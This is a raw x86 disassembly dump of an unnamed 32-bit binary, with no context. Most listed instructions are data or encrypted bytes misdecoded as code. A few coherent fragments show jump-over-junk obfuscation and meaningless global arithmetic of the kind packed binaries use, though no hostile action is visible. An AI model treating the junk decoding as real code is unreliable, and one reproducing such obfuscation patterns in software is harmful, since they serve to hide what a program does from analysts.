  40ce70:	pushf  
  40ce71:	test   BYTE PTR ds:0xfd644d7d,bh
  40ce77:	fdivr  DWORD PTR [eax]
  40ce79:	test   ecx,esi
  40ce7b:	mov    ds:0xbe43508b,al
  40ce80:	out    0x75,al
  40ce82:	and    ch,BYTE PTR [ebx+0x6cdf28a1]
  40ce88:	std    
  40ce89:	xchg   edi,eax
  40ce8a:	pop    ss
  40ce8b:	jbe    0x40cec6
  40ce8d:	ror    DWORD PTR [ecx],0x3b
  40ce90:	mov    ebp,0x6982e7a4
  40ce95:	mov    esp,0x9f7b8b2c
  40ce9a:	cli    
  40ce9b:	mov    cl,0x93
  40ce9d:	(bad)  
  40ce9e:	pop    eax
  40ce9f:	push   esi
  40cea0:	mov    WORD PTR [eax],?
  40cea2:	pop    eax
  40cea3:	lds    ebx,FWORD PTR [ebx+esi*4]
  40cea6:	btr    DWORD PTR [ebx-0x10],ebx
  40ceaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ceab:	jle    0x40ce4f
  40cead:	jl     0x40ce97
  40ceaf:	int3   
  40ceb0:	gs pop esp
  40ceb2:	mov    ebx,0x48e7b69a
  40ceb7:	ret    0xc8fb
  40ceba:	mov    al,ds:0xaaa671c0
  40cebf:	ret    
  40cec0:	xchg   ebp,eax
  40cec1:	hlt    
  40cec2:	je     0x40cf25
  40cec4:	mov    dl,0xf1
  40cec6:	xor    edx,ebx
  40cec8:	xchg   esi,eax
  40cec9:	add    ecx,DWORD PTR [edi+0x4add2650]
  40cecf:	cld    
  40ced0:	dec    eax
  40ced1:	hlt    
  40ced2:	mov    esp,0x2ae6421c
  40ced7:	add    ch,BYTE PTR [edi]
  40ced9:	ins    DWORD PTR es:[edi],dx
  40ceda:	mov    edi,0x439054f2
  40cedf:	cs addr16 shufps xmm2,xmm4,0x5d
  40cee5:	nop
  40cee6:	retf   
  40cee7:	dec    eax
  40cee8:	test   eax,0x447b0ecf
  40ceed:	lock stos BYTE PTR es:[edi],al
  40ceef:	iret   
  40cef0:	mov    dh,0xeb
  40cef2:	nop
  40cef3:	dec    esp
  40cef4:	paddsb mm2,QWORD PTR [ebx+0x144e981e]
  40cefb:	mov    ebx,0x7ba8a28e
  40cf00:	xor    BYTE PTR [edi-0x279c64b1],ch
  40cf06:	xor    eax,0xe5781383
  40cf0b:	xlat   BYTE PTR ds:[ebx]
  40cf0c:	mov    BYTE PTR ds:0xb04bd3ae,cl
  40cf12:	or     bh,BYTE PTR [edi-0x5604f080]
  40cf18:	les    esi,FWORD PTR [edi+0x43253318]
  40cf1e:	cdq    
  40cf1f:	add    esp,DWORD PTR [ebx+0x20]
  40cf22:	enter  0xf0ae,0x63
  40cf26:	push   edx
  40cf27:	jae    0x40cf7a
  40cf29:	mov    ebp,0xa52ba7e9
  40cf2e:	(bad)  
  40cf2f:	mov    ch,0x37
  40cf31:	sbb    DWORD PTR [edi+0x20],edx
  40cf34:	or     al,0x6c
  40cf36:	xchg   esi,eax
  40cf37:	and    al,0xc0
  40cf39:	nop
  40cf3a:	cld    
  40cf3b:	lods   al,BYTE PTR ds:[esi]
  40cf3c:	stc    
  40cf3d:	or     eax,0x9dd657c5
  40cf42:	into   
  40cf43:	lea    esi,[eax+0x28be5c65]
  40cf49:	pop    edi
  40cf4a:	adc    ch,al
  40cf4c:	fisttp QWORD PTR [ebx]
  40cf4e:	retf   0xc1bf
  40cf51:	and    BYTE PTR [ecx+0x4d8162bb],cl
  40cf57:	(bad)  
  40cf58:	scas   eax,DWORD PTR es:[edi]
  40cf59:	xchg   ah,al
  40cf5b:	lds    eax,FWORD PTR [ecx]
  40cf5d:	repz xor DWORD PTR [edx-0x79],ebx
  40cf61:	jp     0x40cf6a
  40cf63:	mov    al,ds:0x5933074d
  40cf68:	mov    edi,0xf02e0a77
  40cf6d:	or     al,0xa9
  40cf6f:	xlat   BYTE PTR ds:[ebx]
  40cf70:	cdq    
  40cf71:	out    dx,eax
  40cf72:	mov    bx,WORD PTR [edx+0xfb02329]
  40cf79:	xor    bl,BYTE PTR [ebx+ebp*2]
  40cf7c:	xor    al,0x25
  40cf7e:	popf   
  40cf7f:	and    ebx,DWORD PTR [esi+eiz*8+0xa]
  40cf83:	jbe    0x40cf69
  40cf85:	xor    eax,0x28ead532
  40cf8a:	rol    dh,cl
  40cf8c:	je     0x40b5e7
  40cf92:	mov    eax,0x800f1c81
  40cf97:	jmp    0x40b5ee
  40cf9c:	push   ebp
  40cf9d:	mov    ebp,esp
  40cf9f:	sub    esp,0x60
  40cfa2:	sbb    DWORD PTR ds:0x42aaa5,0x18d1
  40cfac:	mov    eax,DWORD PTR [ebp+0x8]
  40cfaf:	xor    DWORD PTR ds:0x42aad9,0x42a9bd
  40cfb9:	jmp    0x40d211
  40cfbe:	ror    esp,1
  40cfc0:	mov    dh,0xc5
  40cfc3:	fcmovbe st,st(1)
  40cfc5:	(bad)  [esi]
  40cfc7:	push   ds
  40cfc8:	aad    0x62
  40cfca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfcb:	retf   
  40cfcc:	aas    
  40cfcd:	push   eax
  40cfce:	sub    ah,BYTE PTR [edi+0x7e357878]
  40cfd4:	js     0x40d04e
  40cfd6:	or     cl,BYTE PTR [eax]
  40cfd8:	jae    0x40cf78
  40cfda:	das    
  40cfdb:	out    0x12,eax
  40cfdd:	(bad)  
  40cfde:	push   ebp
  40cfdf:	addr16 fwait
  40cfe1:	shr    BYTE PTR [ebx-0x22],cl
  40cfe4:	mov    BYTE PTR [eax-0x3d2ae7f4],bh
  40cfea:	mov    esp,0xe93d80ff
  40cfef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cff0:	getsec 
  40cff2:	ja     0x40cfb8
  40cff4:	sub    ah,ch
  40cff6:	sub    DWORD PTR [ebx+0x4d],ebp
  40cff9:	loopne 0x40d04c
  40cffb:	imul   esp,DWORD PTR [edi],0xf440fc12
  40d001:	mov    al,ds:0x5ba95e57
  40d006:	(bad)  
  40d007:	fxch   st(5)
  40d009:	mov    cs,WORD PTR [ebp+eiz*1+0x5]
  40d00d:	xor    DWORD PTR [ecx+0x4a],ebp
  40d010:	imul   ebx,ebp,0xb52bdb01
  40d016:	dec    ebp
  40d017:	dec    edx
  40d018:	stos   BYTE PTR es:[edi],al
  40d019:	ret    
  40d01a:	mov    al,ds:0xa27a954
  40d01f:	cli    
  40d020:	nop
  40d021:	repnz inc ebp
  40d023:	sti    
  40d024:	loope  0x40cfcc
  40d026:	das    
  40d027:	outs   dx,BYTE PTR ds:[esi]
  40d028:	mov    dh,0x6b
  40d02a:	sahf   
  40d02b:	inc    esp
  40d02c:	push   0xffffff95
  40d02e:	popa   
  40d02f:	ins    BYTE PTR es:[edi],dx
  40d030:	xor    eax,0xff87967b
  40d035:	pop    es
  40d036:	sti    
  40d037:	xor    ah,ch
  40d039:	xlat   BYTE PTR ds:[ebx]
  40d03a:	xchg   esp,eax
  40d03b:	sub    ah,BYTE PTR [ecx+0x1d9fba58]
  40d041:	int    0x8
  40d043:	mov    esi,0xd92b6a0a
  40d048:	pop    esp
  40d049:	ss popf 
  40d04b:	add    al,0x36
  40d04d:	mov    ecx,0x9ebf6562
  40d052:	inc    ebx
  40d053:	es mov es,ecx
  40d056:	ror    BYTE PTR [eax],0xd4
  40d059:	jmp    0xc8e7b2b2
  40d05e:	sti    
  40d05f:	mov    esp,ecx
  40d061:	fdiv   DWORD PTR [edx+0x44]
  40d064:	add    ch,BYTE PTR ds:0xc72403de
  40d06a:	and    cl,BYTE PTR [edi+0x2f682fc0]
  40d070:	jecxz  0x40d0a8
  40d072:	retf   0xfb3f
  40d075:	cmp    eax,0x150f78f7
  40d07a:	mov    dl,0x36
  40d07c:	call   0xf266:0x4f22677e
  40d083:	(bad)  
  40d084:	imul   DWORD PTR [esi+eax*1+0x74]
  40d088:	push   eax
  40d089:	push   0xffffffad
  40d08b:	cmc    
  40d08c:	pop    es
  40d08d:	out    0x15,eax
  40d08f:	jns    0x40d0b7
  40d091:	pusha  
  40d092:	pop    edi
  40d093:	pop    ecx
  40d094:	sub    eax,0xa04e0e43
  40d099:	retf   
  40d09a:	ret    0xb4c5
  40d09d:	rol    bl,0x59
  40d0a0:	xchg   edi,eax
  40d0a1:	xor    DWORD PTR ds:0x9991baee,ebp
  40d0a7:	cmp    al,BYTE PTR [edi+0x2b421132]
  40d0ad:	loope  0x40d09c
  40d0af:	and    BYTE PTR [esp+esi*2],bh
  40d0b2:	sub    BYTE PTR [ebp+0x15550cf1],bl
  40d0b8:	jo     0x40d07b
  40d0ba:	dec    eax
  40d0bb:	xor    esi,DWORD PTR [ebx+ebp*8-0x2df51b22]
  40d0c2:	fild   QWORD PTR [ebp+0x12a9cc2a]
  40d0c8:	std    
  40d0c9:	add    eax,0xaf125b35
  40d0ce:	xchg   ebx,eax
  40d0cf:	popa   
  40d0d0:	and    al,0x1
  40d0d2:	in     al,0xc8
  40d0d4:	xchg   edi,eax
  40d0d5:	cmp    BYTE PTR [ebx+eax*4+0x1a17af20],cl
  40d0dc:	cmp    al,0x1b
  40d0df:	or     esi,ecx
  40d0e1:	dec    ebp
  40d0e2:	icebp  
  40d0e3:	or     DWORD PTR [ebp-0x46b320a0],esi
  40d0e9:	adc    BYTE PTR [edi+ebp*2],0xf1
  40d0ed:	std    
  40d0ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0ef:	sbb    eax,0x7246f3
  40d0f4:	pop    eax
  40d0f5:	pusha  
  40d0f6:	fs jmp 0x40d0de
  40d0f9:	lds    esi,FWORD PTR [esi+0x69c93286]
  40d0ff:	cwde   
  40d100:	jp     0x40d167
  40d102:	call   0x48d3e25d
  40d107:	ja     0x40d0f6
  40d109:	sbb    BYTE PTR [eax-0x6247c569],ah
  40d10f:	mov    al,0xa2
  40d111:	mov    ebp,0xd7c4df96
  40d116:	mov    ecx,0x6c4af4b5
  40d11b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d11c:	retf   0x50fb
  40d11f:	bound  esp,QWORD PTR [ecx]
  40d121:	cmp    cl,BYTE PTR [ecx+0x668eb1ac]
  40d127:	pop    ebp
  40d128:	shl    DWORD PTR [ebp-0x69],0xd
  40d12c:	hlt    
  40d12d:	push   ds
  40d12e:	cld    
  40d12f:	icebp  
  40d130:	iret   
  40d131:	adc    cl,BYTE PTR [ecx]
  40d133:	ds jecxz 0x40d15c
  40d136:	mov    ebx,0x18107f4d
  40d13b:	jbe    0x40d103
  40d13d:	es ss mov edi,0x1d3c6201
  40d144:	int3   
  40d145:	push   es
  40d146:	xor    BYTE PTR [edx-0x1],bh
  40d149:	add    DWORD PTR [eax+0x1a6ec107],eax
  40d14f:	std    
  40d150:	jle    0x40d12a
  40d152:	mov    edx,0xfec3a2b3
  40d157:	cdq    
  40d158:	cld    
  40d159:	sbb    BYTE PTR ds:[ecx],dl
  40d15c:	je     0x40d190
  40d15e:	(bad)  
  40d15f:	xchg   esi,eax
  40d160:	(bad)  
  40d161:	mov    bl,0x57
  40d163:	push   ss
  40d164:	les    ebx,FWORD PTR [ebx-0x4f883331]
  40d16a:	push   ebx
  40d16b:	lea    esi,[edi]
  40d16d:	in     eax,dx
  40d16e:	push   cs
  40d16f:	bound  edi,QWORD PTR [ebx-0x2b]
  40d172:	push   ss
  40d173:	xchg   edx,eax
  40d174:	sbb    bh,cl
  40d176:	sti    
  40d177:	popa   
  40d178:	or     DWORD PTR [edi+eax*1],esp
  40d17b:	daa    
  40d17c:	outs   dx,BYTE PTR ds:[esi]
  40d17d:	scas   al,BYTE PTR es:[edi]
  40d17e:	or     eax,DWORD PTR [esp+eax*8]
  40d181:	(bad)  
  40d182:	imul   esp,ebx,0x604c9faf
  40d188:	mov    ecx,0x44ba5a01
  40d18d:	stos   BYTE PTR es:[edi],al
  40d18e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d18f:	ret    
  40d190:	inc    esp
  40d191:	jo     0x40d204
  40d193:	cmc    
  40d194:	ret    
  40d195:	shl    BYTE PTR [ecx],0x3f
  40d198:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d199:	fcmovnbe st,st(2)
  40d19b:	aas    
  40d19c:	xor    esi,DWORD PTR [ecx+0x56419e3c]
  40d1a2:	dec    esi
  40d1a3:	test   DWORD PTR [edi-0x3d712585],ebx
  40d1a9:	push   ecx
  40d1aa:	sub    al,0xdd
  40d1ac:	pop    edx
  40d1ad:	in     eax,dx
  40d1ae:	add    DWORD PTR [ebp-0x17],0x19c0d043
  40d1b5:	mov    ebp,0x343e7ef7
  40d1ba:	retf   
  40d1bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1bc:	repz add DWORD PTR [eax-0x591f5f46],0xc16e7951
  40d1c7:	inc    ebx
  40d1c8:	cmp    eax,0xa93bbcf5
  40d1cd:	sbb    DWORD PTR [eax-0x4d],edx
  40d1d0:	inc    ebp
  40d1d1:	and    ebx,DWORD PTR [esi]
  40d1d3:	int    0x21
  40d1d5:	mov    eax,ds:0xbca1d46a
  40d1da:	js     0x40d201
  40d1dc:	in     al,0x24
  40d1de:	pop    es
  40d1df:	push   ebp
  40d1e0:	out    dx,al
  40d1e1:	clc    
  40d1e2:	stos   BYTE PTR es:[edi],al
  40d1e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1e4:	mov    ch,0x12
  40d1e6:	xor    al,0x31
  40d1e8:	leavew 
  40d1ea:	push   eax
  40d1eb:	jae    0x40d215
  40d1ed:	and    ch,BYTE PTR es:[ebx+0x6f58d36e]
  40d1f4:	call   0x5c796e92
  40d1f9:	mov    BYTE PTR [eax-0x3c],ah
  40d1fc:	lods   eax,DWORD PTR ds:[esi]
  40d1fd:	cld    
  40d1fe:	dec    esp
  40d1ff:	dec    ebp
  40d200:	nop
  40d201:	stos   BYTE PTR es:[edi],al
  40d202:	add    DWORD PTR [edi],eax
  40d204:	sahf   
  40d205:	stc    
  40d206:	scas   eax,DWORD PTR es:[edi]
  40d207:	cld    
  40d208:	jp     0x40d1a4
  40d20a:	lahf   
  40d20b:	xor    BYTE PTR [edx+0x30ebf1cc],bh
  40d211:	push   ebx
  40d212:	push   esi
  40d213:	and    DWORD PTR ds:0x42aa15,0x0
  40d21d:	jmp    0x40d22f
  40d222:	mov    ebx,DWORD PTR ds:0x42aa15
  40d228:	inc    ebx
  40d229:	mov    DWORD PTR ds:0x42aa15,ebx
  40d22f:	cmp    DWORD PTR ds:0x42aa15,0x1d
  40d236:	jae    0x40d254
  40d23c:	cmp    DWORD PTR ds:0x42aa15,0x26
  40d243:	jne    0x40d24f
  40d249:	call   DWORD PTR ds:0x41d24c
  40d24f:	jmp    0x40d222
  40d254:	mov    esi,0x7510850
  40d259:	movzx  ebx,WORD PTR ds:0x42a9d5
  40d260:	xor    ebx,DWORD PTR ds:0x42a9bd
  40d266:	mov    DWORD PTR ds:0x42a9d5,ebx
  40d26c:	xor    eax,esi
  40d26e:	or     ebx,0x7ad4
  40d274:	mov    ebx,0x327298
  40d279:	adc    DWORD PTR ds:0x42aa1d,0x42aad9
  40d283:	add    eax,ebx
  40d285:	sub    DWORD PTR ds:0x42aae9,0x2a37
  40d28f:	push   edi
  40d290:	mov    DWORD PTR [ebp-0x18],eax
  40d293:	adc    DWORD PTR ds:0x42aad9,0x18
  40d29d:	mov    edi,DWORD PTR [ebp+0x8]
  40d2a0:	neg    DWORD PTR ds:0x42aaa5
  40d2a6:	xor    edi,esi
  40d2a8:	jmp    0x40d500
  40d2ad:	int    0xca
  40d2af:	iret   
  40d2b0:	retf   0xd9db
  40d2b3:	(bad)  
  40d2b5:	and    ah,ah
  40d2b7:	push   ecx
  40d2b8:	pusha  
  40d2b9:	pusha  
  40d2ba:	mov    esp,0xa5e7d0d3
  40d2bf:	js     0x40d339
  40d2c1:	xor    eax,0x3378787e
  40d2c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2c7:	sub    eax,0xadc4b692
  40d2cd:	aas    
  40d2ce:	pop    esi
  40d2cf:	xor    eax,0x955a0d66
  40d2d4:	lds    edx,FWORD PTR [ecx+0x3b]
  40d2d7:	loope  0x40d33e
  40d2d9:	pop    esi
  40d2da:	jl     0x40d27f
  40d2dc:	mov    ecx,0x3809b5d5
  40d2e1:	inc    edi
  40d2e2:	sbb    BYTE PTR [ebp+0x75],0x35
  40d2e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2e7:	mov    al,0xa1
  40d2e9:	xchg   BYTE PTR [ebx-0x2d75801e],bl
  40d2ef:	ror    BYTE PTR [bp+si+0x606b],0x5c
  40d2f5:	cwde   
  40d2f6:	(bad)  
  40d2f7:	jae    0x40d2e6
  40d2f9:	push   cs
  40d2fa:	mov    esp,DWORD PTR [eax]
  40d2fc:	mov    ch,0x3c
  40d2fe:	pusha  
  40d2ff:	not    BYTE PTR [edx-0x7ef22575]
  40d305:	aam    0xd
  40d307:	mov    eax,ds:0x6ee4abcb
  40d30c:	aad    0x4d
  40d30e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d30f:	call   0x2d2f:0x4abb9aab
  40d316:	add    al,0x58
  40d318:	in     al,dx
  40d319:	adc    eax,0x8478ef63
  40d31e:	in     eax,0xd0
  40d320:	pop    ss
  40d321:	jno    0x40d35d
  40d323:	sub    dh,BYTE PTR [edx-0x7d]
  40d326:	xchg   ecx,eax
  40d327:	or     edx,DWORD PTR ds:0x5e89b402
  40d32d:	xchg   edi,eax
  40d32e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d32f:	jl     0x40d393
  40d331:	dec    esi
  40d332:	mov    eax,0x5ba0b2f2
  40d337:	xchg   edi,eax
  40d338:	push   es
  40d339:	out    0xb4,eax
  40d33b:	xlat   BYTE PTR ds:[ebx]
  40d33c:	mov    ch,0x48
  40d33e:	cs push eax
  40d340:	dec    ebx
  40d341:	ret    
  40d342:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d343:	(bad)  
  40d344:	mov    dl,0xc1
  40d346:	cmp    BYTE PTR [esi+0x52],dh
  40d349:	lock xacquire sbb DWORD PTR [edi],ecx
  40d34d:	jle    0x40d2d3
  40d34f:	ret    0xc084
  40d352:	add    esi,0xeeac4891
  40d358:	nop
  40d359:	sbb    ebp,DWORD PTR [ebx]
  40d35b:	lods   eax,DWORD PTR ds:[esi]
  40d35c:	(bad)  
  40d35d:	jmp    0x770c:0xae382039
  40d364:	lock sbb BYTE PTR ds:0xaa986198,cl
  40d36b:	mov    ebx,0xd0d93551
  40d370:	dec    edi
  40d371:	pop    esp
  40d372:	mov    ecx,0xa4975362
  40d377:	add    esi,ebp
  40d379:	add    al,0xae
  40d37b:	pop    es
  40d37c:	dec    ecx
  40d37d:	xlat   BYTE PTR ds:[ebx]
  40d37e:	inc    edx
  40d37f:	mov    dl,0x92
  40d381:	retf   
  40d382:	addr16 (bad) 
  40d384:	aam    0x4d
  40d386:	into   
  40d387:	sub    cl,BYTE PTR [eax-0x3987f0ef]
  40d38d:	sub    DWORD PTR [edx+0x2012c0aa],ebp
  40d393:	stc    
  40d394:	in     eax,dx
  40d395:	call   0x428c4f32
  40d39a:	push   edx
  40d39b:	fdiv   st(7),st
  40d39d:	sub    cl,BYTE PTR [edi]
  40d39f:	idiv   BYTE PTR [edx-0x19]
  40d3a2:	mov    esp,0xfdf1f0dc
  40d3a7:	adc    esp,DWORD PTR [eax+0x4b3f192e]
  40d3ad:	cmc    
  40d3ae:	test   DWORD PTR [edi],ecx
  40d3b0:	or     ch,BYTE PTR [ecx-0x15e145bd]
  40d3b6:	sbb    al,0xb9
  40d3b8:	xchg   esi,eax
  40d3b9:	pop    ss
  40d3ba:	loope  0x40d3ca
  40d3bc:	xchg   esp,eax
  40d3bd:	mov    BYTE PTR [ebp+0x3fb75b5],cl
  40d3c3:	xchg   edx,eax
  40d3c4:	sbb    al,0xfe
  40d3c6:	lods   eax,DWORD PTR ds:[esi]
  40d3c7:	mov    ch,0x2f
  40d3c9:	sti    
  40d3ca:	inc    ecx
  40d3cb:	add    al,0xfc
  40d3cd:	sub    bl,BYTE PTR [edx+0x50cc96cd]
  40d3d3:	data16 cmp al,ah
  40d3d6:	mov    ebx,0xddc16d68
  40d3db:	jmp    0x2472:0x55c0ab79
  40d3e2:	dec    ebp
  40d3e3:	aaa    
  40d3e4:	test   DWORD PTR [ebx],eax
  40d3e6:	jo     0x40d3bc
  40d3e8:	inc    ecx
  40d3e9:	and    esi,edx
  40d3eb:	push   esi
  40d3ec:	mov    BYTE PTR [edi+0x3556c70f],ah
  40d3f2:	fdivr  DWORD PTR [edi-0x7b]
  40d3f5:	mov    ebp,0x8051b57b
  40d3fa:	sbb    eax,0x32f576d8
  40d3ff:	push   cs
  40d400:	sahf   
  40d401:	mov    DWORD PTR [ecx],esi
  40d403:	retf   
  40d404:	sti    
  40d405:	jp     0x40d38f
  40d407:	xchg   ebp,eax
  40d408:	xchg   edx,eax
  40d409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d40a:	enter  0xd15a,0xb2
  40d40e:	or     esi,DWORD PTR [edx-0x4c]
  40d411:	cmp    BYTE PTR [esi],cl
  40d413:	mov    BYTE PTR [ebx+0x4c],bl
  40d416:	mov    ebx,0x2df032c5
  40d41b:	xchg   BYTE PTR cs:[ebp+0x53],al
  40d41f:	(bad)  
  40d420:	cmp    ebp,ecx
  40d422:	dec    edi
  40d423:	icebp  
  40d424:	mov    al,ds:0xeea88259
  40d429:	scas   al,BYTE PTR es:[edi]
  40d42a:	scas   eax,DWORD PTR es:[edi]
  40d42b:	or     DWORD PTR [ecx+ebp*1-0x75],0xffffffa5
  40d430:	jnp    0x40d49f
  40d432:	jb     0x40d483
  40d434:	sub    eax,0xbec776c1
  40d439:	jmp    0x1716:0x317f1586
  40d440:	fcmovne st,st(2)
  40d442:	dec    esi
  40d443:	das    
  40d444:	in     eax,0x2f
  40d446:	inc    eax
  40d447:	outs   dx,BYTE PTR ds:[esi]
  40d448:	iret   
  40d449:	setb   BYTE PTR [ebx]
  40d44c:	lds    ebp,FWORD PTR [ebx+0x5ede0354]
  40d452:	sbb    BYTE PTR [ecx],al
  40d454:	adc    edi,eax
  40d456:	jge    0x40d415
  40d458:	push   esi
  40d459:	arpl   WORD PTR [edx+0x76582649],di
  40d45f:	mov    eax,0xecbc905a
  40d464:	pop    ss
  40d465:	in     al,0x10
  40d467:	xchg   DWORD PTR [ebx+edx*8],edi
  40d46a:	dec    esp
  40d46b:	and    al,0xed
  40d46d:	push   ecx
  40d46e:	lods   eax,DWORD PTR ds:[esi]
  40d46f:	ret    
  40d470:	fsubr  DWORD PTR [eax]
  40d472:	or     eax,DWORD PTR [edx]
  40d474:	retf   0x93e8
  40d477:	daa    
  40d478:	xchg   edi,eax
  40d479:	jmp    0xb176eb9c
  40d47e:	leave  
  40d47f:	test   eax,0x176f9ae0
  40d484:	pop    ecx
  40d485:	sub    ebx,DWORD PTR [eax-0x2b]
  40d488:	mov    DWORD PTR [ecx+0x60a33398],esp
  40d48e:	xchg   ebp,eax
  40d48f:	not    DWORD PTR [esi]
  40d491:	mov    ebp,0xc37b0ef2
  40d496:	es pushf 
  40d498:	rol    BYTE PTR [esi-0x13],0x38
  40d49c:	retf   
  40d49d:	adc    al,0xbc
  40d49f:	adc    edi,ecx
  40d4a1:	sbb    bh,cl
  40d4a3:	sub    esp,DWORD PTR [edx+ebx*4-0x353925b2]
  40d4aa:	jle    0x40d4cd
  40d4ac:	push   edi
  40d4ad:	add    al,0x12
  40d4af:	lds    ebp,FWORD PTR [edx+0x65708831]
  40d4b5:	test   ah,cl
  40d4b7:	add    ebx,DWORD PTR [ebp-0x629228a8]
  40d4bd:	sbb    esi,DWORD PTR [edx+0x1]
  40d4c0:	add    DWORD PTR [ebp+edx*8+0x26df3f4e],edi
  40d4c7:	std    
  40d4c8:	call   DWORD PTR [edi-0x62]
  40d4cb:	inc    eax
  40d4cc:	inc    edi
  40d4cd:	and    al,0xc3
  40d4cf:	(bad)
  40d4d3:	in     eax,dx
  40d4d4:	push   ebp
  40d4d5:	sub    al,BYTE PTR [edx+ebp*8+0x30044fe9]
  40d4dc:	addr16 fnop 
  40d4df:	daa    
  40d4e0:	jg     0x40d492
  40d4e2:	(bad)  
  40d4e3:	cmp    BYTE PTR [ecx],dh
  40d4e5:	fimul  DWORD PTR [esi]
  40d4e7:	clc    
  40d4e8:	in     eax,dx
  40d4e9:	add    ecx,DWORD PTR [edx-0x5a]
  40d4ec:	ins    DWORD PTR es:[edi],dx
  40d4ed:	sub    BYTE PTR ds:0xb89603b1,dl
  40d4f3:	cmp    bh,BYTE PTR [ecx]
  40d4f5:	xchg   esi,eax
  40d4f6:	jbe    0x40d550
  40d4f8:	jns    0x40d499
  40d4fa:	pop    edi
  40d4fb:	sbb    DWORD PTR [edx-0x387bcb1f],ebp
  40d501:	inc    ebp
  40d502:	hlt    
  40d503:	clc    
  40d504:	test   DWORD PTR [eax+edi*8+0x38f045c7],ebx
  40d50b:	xchg   DWORD PTR [eax+edi*8-0x55aada7f],ebx
  40d512:	inc    edx
  40d513:	add    BYTE PTR [ebp-0x56],ah
  40d516:	inc    edx
  40d517:	add    BYTE PTR [ebx],al
  40d519:	sti    
  40d51a:	jmp    0x40e985
  40d51f:	cmp    edi,0x3f
  40d522:	jne    0x40d55a
  40d528:	mov    eax,0x337e
  40d52d:	mov    eax,ds:0x41e966
  40d532:	mov    eax,DWORD PTR [eax]
  40d534:	mov    DWORD PTR [ebp-0x14],eax
  40d537:	mov    eax,ds:0x41eb6e
  40d53c:	mov    DWORD PTR ds:0x42a9c9,0x45db
  40d546:	mov    eax,DWORD PTR [eax]
  40d548:	mov    DWORD PTR [ebp-0x18],eax
  40d54b:	mov    DWORD PTR ds:0x42aa2d,0x1d30
  40d555:	jmp    0x40e979
  40d55a:	mov    DWORD PTR ds:0x42aa95,0x19ca
  40d564:	jmp    0x40d7bc
  40d569:	leave  
  40d56a:	ret    
  40d56b:	enter  0xd6c6,0xd9
  40d56f:	fld    st(3)
  40d571:	int    0x93
  40d573:	fdiv   st,st(0)
  40d575:	cmp    esi,DWORD PTR [ebx]
  40d577:	jg     0x40d5b7
  40d579:	pushf  
  40d57a:	stos   DWORD PTR es:[edi],eax
  40d57b:	js     0x40d5f5
  40d57d:	xor    eax,0x2578787e
  40d582:	sub    ecx,eax
  40d584:	or     al,0x45
  40d586:	fs retf 
  40d588:	ja     0x40d50e
  40d58a:	mov    bh,0x5
  40d58c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d58d:	xchg   edi,eax
  40d58e:	int    0x39
  40d590:	mov    eax,0xd2652cd4
  40d595:	(bad)  
  40d596:	mov    eax,0x57309e85
  40d59b:	add    DWORD PTR [ebp+0x2233803b],ebp
  40d5a1:	mov    al,ds:0x200b558d
  40d5a6:	xchg   esp,eax
  40d5a7:	std    
  40d5a8:	mov    ebp,0xb46a2afe
  40d5ad:	push   edi
  40d5ae:	jp     0x40d606
  40d5b0:	shl    ecx,cl
  40d5b2:	fs (bad) 
  40d5b4:	mov    cl,0x9
  40d5b6:	push   0xce6efa03
  40d5bb:	mov    esp,0xe2e02ee9
  40d5c0:	cli    
  40d5c1:	add    DWORD PTR [ecx-0x3],edi
  40d5c4:	mov    ds:0x39cb640e,al
  40d5c9:	cmp    WORD PTR [eax-0x69a5c82],dx
  40d5d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5d1:	adc    ch,ah
  40d5d3:	mov    ds:0xa233bc0d,eax
  40d5d8:	lock or esi,ecx
  40d5db:	dec    eax
  40d5dc:	sbb    edi,0x907a33ae
  40d5e2:	jge    0x40d634
  40d5e4:	inc    edx
  40d5e5:	push   0x403cc2dd
  40d5ea:	and    edi,DWORD PTR [esi-0x53102870]
  40d5f0:	sub    al,BYTE PTR [esi-0x68]
  40d5f3:	push   ss
  40d5f4:	test   eax,0x7089ea1e
  40d5f9:	adc    eax,0xecdc9d92
  40d5fe:	ret    
  40d5ff:	xor    esi,DWORD PTR [ecx]
  40d601:	loop   0x40d62c
  40d603:	addr16 push ebp
  40d605:	out    dx,eax
  40d606:	stc    
  40d607:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d608:	jg     0x40d61e
  40d60a:	das    
  40d60b:	sub    BYTE PTR cs:[esi],0x75
  40d60f:	pop    ebx
  40d610:	cmp    DWORD PTR [ecx+0x64],0xffffff96
  40d614:	ds scas al,BYTE PTR es:[edi]
  40d616:	cmp    bh,BYTE PTR [edi-0x982f8e2]
  40d61c:	sub    eax,DWORD PTR [ebx]
  40d61e:	repnz pop esp
  40d620:	(bad)  
  40d621:	dec    ebp
  40d622:	pop    esp
  40d623:	pusha  
  40d624:	mov    DWORD PTR [ebp-0x13],ebp
  40d627:	fcom   DWORD PTR [edi]
  40d629:	mov    ss,edi
  40d62b:	jno    0x40d69b
  40d62d:	add    BYTE PTR [ebp-0x58943a82],ch
  40d633:	aad    0xf9
  40d635:	adc    esp,DWORD PTR [ebp+0x2e21a1fd]
  40d63b:	arpl   WORD PTR [eax],ax
  40d63d:	mov    cl,BYTE PTR [esi+0x7a]
  40d640:	bound  ecx,QWORD PTR [edi+0x68]
  40d643:	cwde   
  40d644:	sbb    al,0x4d
  40d646:	cli    
  40d647:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d648:	test   eax,0x7e223bb1
  40d64d:	ret    0xca97
  40d650:	pop    ebp
  40d651:	loop   0x40d5df
  40d653:	xor    cl,BYTE PTR [edi-0xf]
